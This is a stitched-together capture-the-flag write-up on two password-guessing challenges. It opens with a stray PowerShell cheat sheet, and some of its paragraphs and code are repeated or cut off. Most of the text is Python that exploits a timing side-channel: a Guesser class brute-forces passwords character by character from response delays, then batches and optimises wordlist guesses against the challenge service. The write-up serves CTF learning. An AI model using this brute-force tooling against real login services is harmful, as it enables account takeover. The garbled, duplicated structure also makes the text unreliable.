An agnozing example Get-ChildItem -Path C :\\ -Force -Recurse -ErrorAction SilentlyContinue -Include interesting -file * Get-Content \u00b6 Get contents of file, like bash cat command. Select-Object \u00b6 Pull out properties from output of another cmdlet. eg. To list just the mode and name for files/dirs within the current directory Get-ChildItem | Select-Object -Property Mode , Name eg. Get first 5 items in current directory (like head in bash) Get-ChildItem | Select-Object -First 5 eg. Get last 5 items in current directory (like tail in bash) Get-ChildItem | Select-Object -Last 5 Other useful flags: - Index - Unique - Skip - ExcludeProperty Where-Object \u00b6 Only select objects that match a filter. Sort of like grep . eg. List files modified after 10/4/2019 Get-ChildItem | Where-Object -Property LastWriteTime -GT 10 / 4 / 2019 Useful operators: -Contains - if collection has item that exactly matches -EQ - Exactly equal -LT -GT -GE - Greater than or equal For more details: https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/where-object?view=powershell-7.1#examples Sort-Object \u00b6 Kinda like bash sort command.

Only through being methodical can enlightenment be achieved Note : This challenge has a second part which is a trophy challenge.

We have also managed to learn how those passwords are checked: def check_pwd ( sample , pwd ): for s , p in zip_longest ( sample , pwd ): if s is None or p is None : return False if p != s : time . sleep ( 0.5 ) # Add a delay to stop password-guessing attacks return False return True nc $target_dns $target_port Play Along at Home \u00b6 During the CTF, the challenge was hosted at pwdguessr.chal.cybears.io:2323 To play after the CTF, run docker run --name pwdguessr1 -dp 2323 :2323 --rm registry.gitlab.com/cybears/fall-of-cybeartron/misc-pwdguessr and then change the host in the scripts to 127.0.0.1 Walkthrough \u00b6 Initial Recon \u00b6 From the definition of check_pwd given in the challenge description, it appears that when submitting a password there are three possible outcomes: Success - If we get the password entirely correct Delayed Failure - If the attempted password is not a prefix of the real password, there will be a 500ms delay Immediate Failure - If the attempted password is a prefix of the real password, it will return immediately Connecting to the challenge with nc pwdguessr.chal.cybears.io 2323 shows the prompt Welcome, user 5909559.

Entering a random password lead to a brief pause, followed by the response Sorry, that password was incorrect. Please enter your password: Note The response does not end with a newline, so recvline will not work while scripting this Bruteforce \u00b6 To get a better idea of the passwords, a script was written to iteratively bruteforce character by character, continuing whenever an attempted password does not cause a 500ms delay.

This was uncovered during PwdGuessr 2 , but caused unexplained failure in ~4% of attempts.

Only through being methodical can enlightenment be achieved You round a bend in the road, and your party is set upon by bandits - an ambush! Fortunately, you've been praciticing your martial arts, and you take the opportunity to show off your latest moves. You kca-spank your way to a comprehensive victory, sending the bandits packing. As they run, one of them drops the device they use to coodinate their activities. If you can recover the credentials of enough bandits, you can make sure to avoid their attentions for the foreseeable future. nc $target_dns $target_port def check_pwd ( sample , pwd ): for s , p in zip_longest ( sample , pwd ): if s is None or p is None : return False if p != s : time . sleep ( 0.5 ) # Add a delay to stop password-guessing attacks return False return True nc $target_dns $target_port Play Along at Home \u00b6 During the CTF, the challenge was hosted at pwdguessr22222.chal.cybears.io:2323 To play after the CTF, run docker run --name pwdguessr2 -dp 2323 :2323 --rm registry.gitlab.com/cybears/fall-of-cybeartron/misc-pwdguessr2 and then change the host in the scripts to 127.0.0.1 Walkthrough \u00b6 Recap \u00b6 Last challenge we discovered that the passwords were chosen by concatenating four pieces of information: A day of the week A movie from Harry Potter or the Nine Starwars Movies An element of the Periodic Table A nato phonetic alphabet letter This means there are 7 * 19 * 120 * 26 = 414960 possible passwords Discovery \u00b6 This challenge was primarily an optimisation challenge, so largely was based off the original source with multiple refactors Connecting to the challenge with nc pwdguessr22222.chal.cybears.io 2323 gave the following banner: You need to prove your efficiency at password guessing. Send a single natural number to get that many IDs, each representing a password to guess. Send a comma separated list of ID:guess (up to 20 at a time) to get back a comma separated list of results. You still need to recover 200 passwords. You have 6000 incorrect guesses remaining. Which gives two useful bits of information If we wish to speed up out attempts, we can make up to 20 guesses at a time We need to guess 200 passwords with 6000 incorrect guesses, meaning we must average less than 30 incorrect guesses per user In the connection, sending a number gives user IDs which are UUIDs, which could then be used to guess For this challenge, rather than delaying the output for incorrect passwords, it returned either _ for partially correct, 1 for fully correct, and 0 for incorrect. This made it much faster. Theorising \u00b6 At first, I was uncertain whether there was a correlation between each segment of the password so I made a script to bulk solve challenge 1 and record the results in a CSV. To do this, I refactored my guesser into a class Guesser class Guesser : def __init__ ( self , host = HOST , port = PORT ): self . r = remote ( host , port ) self . host = host self . port = port user_line = self . r . recvline () . decode () self . user = user_line . split ( \" \" )[ - 1 ][: - 2 ] self . r . recvuntil ( \"Please enter your password: \" ) self . password = None self . guesses = 0 self . incorrect = 0 def check ( self , password ): log . debug ( f \"Checking: { password } \" ) self . guesses += 1 before = time . time () self . r . sendline ( password ) out = self . r . recv ( 5 ) if out != b \"Sorry\" : if out == b \"Conne\" : raise Timeout self . password = password raise SuccessfulConnection ( out . decode ()) after = time . time () self . r . recvuntil ( \"Please enter your password: \" ) delta = after - before if delta < 0.5 : self . password = password return True self . incorrect += 1 return False def brute_force ( self , password : str = \"\" ): log . warning ( f \"Brute forcing from: { password } \" ) while True : for c in tqdm ( ALPHABET ): if self . check ( password + c ): password += c log . debug ( f \"Partial: { password } \" ) break else : raise NotFound ( \"Brute\" ) def guess_words ( self , words , password : str = \"\" , fallback = True ): for word in words : test = password + word if self . check ( test ): return test else : if fallback : log . warn ( f \"Failed to use password from { words } \" ) log . warn ( \"Falling back to bruteforce\" ) return self . brute_force ( password ) else : return None def guess_words_smart ( self , words , password : str = \"\" ): # Napkin maths says 4 is a good number if len ( words ) < 4 : return self . guess_words ( words , password ) first_letters = Counter ( word [ 0 ] for word in words ) . most_common () if first_letters [ 0 ][ 1 ] == 1 : return self . guess_words ( words , password ) first_letters_s = [ letter for letter , cnt in first_letters if cnt > 1 ] new_s = self . guess_words ( first_letters_s , password , fallback = False ) if new_s is None : new_words = [ word for word in words if word [ 0 ] not in first_letters_s ] assert len ( new_words ) > 0 return self . guess_words_smart ( new_words , password ) words = [ word [ 1 :] for word in words if word [ 0 ] == new_s [ - 1 ]] return self . guess_words_smart ( words , new_s ) def solve ( self ): try : password = self . guess_words_smart ( days ) log . info ( f \"Partial: { password !r} \" ) password = self . guess_words_smart ( movies , password ) log . info ( f \"Partial: { password !r} \" ) password = self . guess_words_smart ( elements , password ) log . info ( f \"Partial: { password !r} \" ) password = self . guess_words_smart ( nato_phonetic , password ) log . info ( f \"Partial: { password !r} \" ) log . warning ( \"Something after phonetic alphabet, resorting to brute force\" ) self . brute_force ( password ) except SuccessfulConnection as e : log . info ( \"We're in!\" ) out = self . r . recvall ( 0.1 ) msg = e . args [ 0 ] + out . decode () log . info ( f \"Guesses: { self . guesses } \" ) log . info ( f \"User: { self . user } \" ) log . info ( f \"Password: { self . password } \" ) log . info ( f \"MSG: { msg } \" ) return True , self . guesses , self . password , self . user , self . incorrect except ( Timeout , EOFError , AssertionError ): return False , self . guesses , self . password , self . user , self . incorrect except Exception as e : log . exception ( e ) return False , self . guesses , self . password , self . user , self . incorrect finally : self . r . close () And wrote a bulk guesser script import multiprocessing from guesser import Guesser from pwn import * PARALLELISM = 50 SAMPLES = 200 def run_guess ( idx ): log . info ( f \"Starting { idx } \" ) try : guesser = Guesser () return guesser . solve () except : return None def main (): with multiprocessing .

Conveniently I had been running Wireshark in the background so I saw what had occurred I'd received a \"flag\" of did_you_really_think_cybears{would_make_it_this_easy}? Followed by a banner like the original, but with an extra line at the end You need to prove even more efficiency at password guessing. Send a single natural number to get that many IDs, each representing a password to guess. Send a comma separated list of ID:guess (up to {} at a time) to get back a comma separated list of results. This time, you're given the length of each password alongside its ID. This meant that I had to repeat the 200 password part (which took 15) mins and then repeat, but this time using the known length of each password to reduce the incorrect attempts. Optimisation - Concurrency \u00b6 As waiting > 15 mins per attempt was impractical, (and I was still hopeful for first solve) I decided to bite the bullet and rewrite the guesser to guess 20 users at a time, with comma separated uid:password pairs. Dataloader \u00b6 The approach I took for writing this is inspired by https://github.com/graphql/dataloader in that a dataloader receives requests, and batches the requests once a condition is reached. This was the first time I've ever really had to use Future's in Python, but as they are similar to Promise's in javascript, the learning curve was fine. class Loader : def __init__ ( self , r : remote ): self . r = r self . total_guessers = 0 self . incorrect_guesses = 0 self . guessers = 0 self . futures = [] def add_guesser ( self ): self . guessers += 1 self . total_guessers += 1 def remove_guesser ( self ): self . guessers -= 1 if len ( self . futures ) == self . guessers and self . guessers > 0 : self . resolve_batch () def submit ( self , user : str , password : str , future : asyncio .

Optimisation - Benchmarking \u00b6 At this point, I needed a good way of testing the optimisations quickly to enable fast iteration on design. Thankfully the async rewrite had decoupled the network connectivity and the Guesser class which meant I could create a mock dataloader to serve previous passwords and benchmark the design quickly. I wrote an alternative dataloader and main which read the CSV acquired from the theorising step that looked like def check_pwd ( sample , pwd ): for s , p in zip_longest ( sample , pwd ): if s is None or p is None : return \"_\" if p != s : return \"0\" return \"1\" class FakeLoader ( Loader ): def __init__ ( self , r : remote , user_data : Dict [ str , str ]): super () . __init__ ( r ) self . user_data = user_data def add_guesser ( self ): super ( FakeLoader , self ) . add_guesser () def resolve_batch ( self ): futures = self . futures self . futures = [] for user , password , future in futures : sample = self . user_data [ user ] resp = check_pwd ( sample , password ) log . debug ( f \"Resolved: ( { user =} , { password =} ) => { resp } \" ) if resp == \"0\" : self . incorrect_guesses += 1 future . set_result ( False ) elif resp == \"_\" : future . set_result ( True ) elif resp == \"1\" : future . set_exception ( SuccessfulConnection ( password )) async def fake_main (): log . setLevel ( \"INFO\" ) with open ( \"results.csv\" ) as f : reader = csv . reader ( f ) passwords = [ row [ 2 ] for row in reader if row [ 0 ] == \"True\" ] user_data = { str ( uuid4 ()): password for password in passwords } loader = FakeLoader ( None , user_data ) for user , password in tqdm ( user_data . items ()): guesser = GuesserAsync ( loader , f \" { user } : { len ( password ) } \" ) await guesser . solve () avg_mistakes = round ( loader . incorrect_guesses / loader . total_guessers , 2 ) log . info ( f \"Total Mistakes: { loader . incorrect_guesses } \" ) log . info ( f \"Avg Mistakes: { avg_mistakes } \" ) This meant that I could test against 200 passwords in less than a second Optimisation - Length Based Filtering \u00b6 Modifying the GuesserAsync to support optional max length was as simple as changing the __init__ def __init__ ( self , loader : Loader , user : str ): self . loader = loader if \":\" in user : self . user , max_len = user . split ( \":\" ) self . max_len = int ( max_len ) else : self . user = user self . max_len = None log . debug ( f \"Init: user= { user !r} \" ) self . guesses = 0 self . loader . add_guesser () I then made changes to guess_words_smart , to use the max_len to filter what words and letters were attempted, and in what order. To do this, I added an optional arg round that specified what round of words it was in, so different optimisations could be used for each wordlist. I made two optimisations which brought the average mistakes below 15. Nato Phonetic (Round 4) \u00b6 When guessing the Nato Phonetic alphabet, I filtered the words to only include words which would lead to a string of the target length This brought the avg mistakes from 26.3 => 16.3. Elements (Round 3) \u00b6 When checking elements, I changed the sorting of the first letters to count the combinations of element+nato_letter which had a password of target length. This brought the avg mistakes from 16.3 => 14.7 which was under the required count. Source \u00b6 This meant the guess_words_smart function looked like async def guess_words_smart ( self , words , password : str = \"\" , round = None ): # log.debug(f\"Partial: {self.password!r}\") # Napkin maths says 4 is a good number if len ( words ) < 3 : return await self . guess_words ( words , password ) first_letters = Counter ( word [ 0 ] for word in words ) . most_common () # Length based optimizations if self . max_len is not None : current = len ( password ) delta = self . max_len - current if round == 3 : pass first_letters = Counter ( word [ 0 ] for word , next_word in product ( words , nato_phonetic ) if len ( word + next_word ) == delta ) . most_common () elif round == 4 : words = [ word for word in words if len ( word ) == delta ] if first_letters [ 0 ][ 1 ] == 1 : return await self . guess_words ( words , password ) first_letters_s = [ letter for letter , cnt in first_letters if cnt > 1 ] new_s = await self . guess_words ( first_letters_s , password ) if new_s is None : new_words = [ word for word in words if word [ 0 ] not in first_letters_s ] assert len ( new_words ) > 0 return await self . guess_words_smart ( new_words , password , round = round ) words = [ word [ 1 :] for word in words if word [ 0 ] == new_s [ - 1 ]] return await self . guess_words_smart ( words , new_s , round = round ) Success \u00b6 With these optimisations, I ran the script, the first time it ran out of guesses with one password remaining and at the nato alphabet round, so given how close it was, I just ran it again, which got me the flag.

Which gives two useful bits of information If we wish to speed up out attempts, we can make up to 20 guesses at a time We need to guess 200 passwords with 6000 incorrect guesses, meaning we must average less than 30 incorrect guesses per user In the connection, sending a number gives user IDs which are UUIDs, which could then be used to guess For this challenge, rather than delaying the output for incorrect passwords, it returned either _ for partially correct, 1 for fully correct, and 0 for incorrect.
